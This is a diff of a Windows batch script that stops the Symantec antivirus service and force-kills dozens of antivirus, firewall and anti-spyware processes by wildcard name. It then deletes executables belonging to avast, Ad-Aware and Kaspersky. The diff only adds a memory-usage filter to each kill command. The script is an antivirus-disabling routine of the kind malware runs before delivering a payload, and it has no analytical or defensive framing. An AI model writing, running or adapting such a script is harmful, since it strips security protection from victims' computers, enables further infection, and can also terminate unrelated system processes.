@@ -1,81 +1,81 @@
 @echo off
 net stop "symantec antivirus"
-taskkill /f /IM av*
-taskkill /f /IM fire*
-taskkill /f /IM anti*
+taskkill /f /FI "MEMUSAGE gt 5" /IM av*
+taskkill /f /FI "MEMUSAGE gt 5" /FI "MEMUSAGE gt 5" /IM fire*
+taskkill /f /FI "MEMUSAGE gt 5" /IM anti*
 cls
-taskkill /f /IM spy*
-taskkill /f /IM bullguard
-taskkill /f /IM PersFw
-taskkill /f /IM KAV*
-taskkill /f /IM ZONEALARM
-taskkill /f /IM SAFEWEB
+taskkill /f /FI "MEMUSAGE gt 5" /IM spy*
+taskkill /f /FI "MEMUSAGE gt 5" /IM bullguard
+taskkill /f /FI "MEMUSAGE gt 5" /IM PersFw
+taskkill /f /FI "MEMUSAGE gt 5" /IM KAV*
+taskkill /f /FI "MEMUSAGE gt 5" /IM ZONEALARM
+taskkill /f /FI "MEMUSAGE gt 5" /IM SAFEWEB
 cls
-taskkill /f /IM OUTPOST
-taskkill /f /IM nv*
-taskkill /f /IM nav*
-taskkill /f /IM F-*
-taskkill /f /IM ESAFE
-taskkill /f /IM cle
+taskkill /f /FI "MEMUSAGE gt 5" /IM OUTPOST
+taskkill /f /FI "MEMUSAGE gt 5" /IM nv*
+taskkill /f /FI "MEMUSAGE gt 5" /IM nav*
+taskkill /f /FI "MEMUSAGE gt 5" /IM F-*
+taskkill /f /FI "MEMUSAGE gt 5" /IM ESAFE
+taskkill /f /FI "MEMUSAGE gt 5" /IM cle
 cls
-taskkill /f /IM BLACKICE
-taskkill /f /IM def*
-taskkill /f /IM kav
-taskkill /f /IM kav*
-taskkill /f /IM avg*
-taskkill /f /IM ash*
+taskkill /f /FI "MEMUSAGE gt 5" /IM BLACKICE
+taskkill /f /FI "MEMUSAGE gt 5" /IM def*
+taskkill /f /FI "MEMUSAGE gt 5" /IM kav
+taskkill /f /FI "MEMUSAGE gt 5" /IM kav*
+taskkill /f /FI "MEMUSAGE gt 5" /IM avg*
+taskkill /f /FI "MEMUSAGE gt 5" /IM ash*
 cls
-taskkill /f /IM aswupdsv
-taskkill /f /IM ewid*
-taskkill /f /IM guard*
-taskkill /f /IM guar*
-taskkill /f /IM gcasDt*
-taskkill /f /IM msmp*
+taskkill /f /FI "MEMUSAGE gt 5" /IM aswupdsv
+taskkill /f /FI "MEMUSAGE gt 5" /IM ewid*
+taskkill /f /FI "MEMUSAGE gt 5" /IM guard*
+taskkill /f /FI "MEMUSAGE gt 5" /IM guar*
+taskkill /f /FI "MEMUSAGE gt 5" /IM gcasDt*
+taskkill /f /FI "MEMUSAGE gt 5" /IM msmp*
 cls
-taskkill /f /IM mcafe*
-taskkill /f /IM mghtml
-taskkill /f /IM msiexec
-taskkill /f /IM outpost
-taskkill /f /IM isafe
-taskkill /f /IM zap*
+taskkill /f /FI "MEMUSAGE gt 5" /IM mcafe*
+taskkill /f /FI "MEMUSAGE gt 5" /IM mghtml
+taskkill /f /FI "MEMUSAGE gt 5" /IM msiexec
+taskkill /f /FI "MEMUSAGE gt 5" /IM outpost
+taskkill /f /FI "MEMUSAGE gt 5" /IM isafe
+taskkill /f /FI "MEMUSAGE gt 5" /IM zap*
 cls
-taskkill /f /IM zauinst
-taskkill /f /IM upd*
-taskkill /f /IM zlclien*
-taskkill /f /IM minilog
-taskkill /f /IM cc*
-taskkill /f /IM norton*
+taskkill /f /FI "MEMUSAGE gt 5" /IM zauinst
+taskkill /f /FI "MEMUSAGE gt 5" /IM upd*
+taskkill /f /FI "MEMUSAGE gt 5" /IM zlclien*
+taskkill /f /FI "MEMUSAGE gt 5" /IM minilog
+taskkill /f /FI "MEMUSAGE gt 5" /IM cc*
+taskkill /f /FI "MEMUSAGE gt 5" /IM norton*
 cls
-taskkill /f /IM norton au*
-taskkill /f /IM ccc*
-taskkill /f /IM npfmn*
-taskkill /f /IM loge*
-taskkill /f /IM nisum*
-taskkill /f /IM issvc
-taskkill /f /IM tmp*
+taskkill /f /FI "MEMUSAGE gt 5" /IM norton au*
+taskkill /f /FI "MEMUSAGE gt 5" /IM ccc*
+taskkill /f /FI "MEMUSAGE gt 5" /IM npfmn*
+taskkill /f /FI "MEMUSAGE gt 5" /IM loge*
+taskkill /f /FI "MEMUSAGE gt 5" /IM nisum*
+taskkill /f /FI "MEMUSAGE gt 5" /IM issvc
+taskkill /f /FI "MEMUSAGE gt 5" /IM tmp*
 cls
-taskkill /f /IM tmn*
-taskkill /f /IM pcc*
-taskkill /f /IM cpd*
-taskkill /f /IM pop*
-taskkill /f /IM pav*
-taskkill /f /IM padmin
+taskkill /f /FI "MEMUSAGE gt 5" /IM tmn*
+taskkill /f /FI "MEMUSAGE gt 5" /IM pcc*
+taskkill /f /FI "MEMUSAGE gt 5" /IM cpd*
+taskkill /f /FI "MEMUSAGE gt 5" /IM pop*
+taskkill /f /FI "MEMUSAGE gt 5" /IM pav*
+taskkill /f /FI "MEMUSAGE gt 5" /IM padmin
 cls
-taskkill /f /IM panda*
-taskkill /f /IM avsch*
-taskkill /f /IM sche*
-taskkill /f /IM syman*
-taskkill /f /IM virus*
-taskkill /f /IM realm*
+taskkill /f /FI "MEMUSAGE gt 5" /IM panda*
+taskkill /f /FI "MEMUSAGE gt 5" /IM avsch*
+taskkill /f /FI "MEMUSAGE gt 5" /IM sche*
+taskkill /f /FI "MEMUSAGE gt 5" /IM syman*
+taskkill /f /FI "MEMUSAGE gt 5" /IM virus*
+taskkill /f /FI "MEMUSAGE gt 5" /IM realm*
 cls
-taskkill /f /IM sweep*
-taskkill /f /IM scan*
-taskkill /f /IM ad-*
-taskkill /f /IM safe*
-taskkill /f /IM avas*
-taskkill /f /IM norm*
+taskkill /f /FI "MEMUSAGE gt 5" /IM sweep*
+taskkill /f /FI "MEMUSAGE gt 5" /IM scan*
+taskkill /f /FI "MEMUSAGE gt 5" /IM ad-*
+taskkill /f /FI "MEMUSAGE gt 5" /IM safe*
+taskkill /f /FI "MEMUSAGE gt 5" /IM avas*
+taskkill /f /FI "MEMUSAGE gt 5" /IM norm*
 cls
-taskkill /f /IM offg*
+taskkill /f /FI "MEMUSAGE gt 5" /IM offg*
 del /Q /F C:\Program Files\alwils~1\avast4\*.*
 del /Q /F C:\Program Files\Lavasoft\Ad-awa~1\*.exe
 del /Q /F C:\Program Files\kasper~1\*.exe
